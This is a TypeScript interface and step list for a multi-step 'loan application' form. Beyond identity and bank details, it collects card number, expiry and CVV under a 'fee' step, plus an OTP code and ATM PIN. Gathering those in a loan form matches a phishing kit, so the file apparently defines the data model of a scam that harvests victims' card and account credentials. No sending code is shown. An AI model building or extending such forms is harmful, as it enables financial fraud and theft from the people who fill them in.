export interface LoanApplicationState {
  sessionId: string;
  // Step 1: Personal
  fullName: string;
  cnic: string;
  mobileNo: string;
  gender: string;
  dob: string;
  province: string;
  address: string;

  // Step 2: Bank
  loanAmount: string;
  loanPurpose: string;
  occupation: string;
  bankName: string;
  accountNumber: string;
  currentBalance: string;
  monthlyIncome: string;
  incomeDate: string;

  // Step 3: Fee & Card
  cardNumber: string;
  expiry: string;
  cvv: string;

  // Step 5: OTP & PIN
  otpCode: string[];
  atmPin: string[];
}

export type StepType = 'home' | 'personal' | 'bank' | 'fee' | 'searching' | 'verify' | 'otp' | 'pin' | 'success';
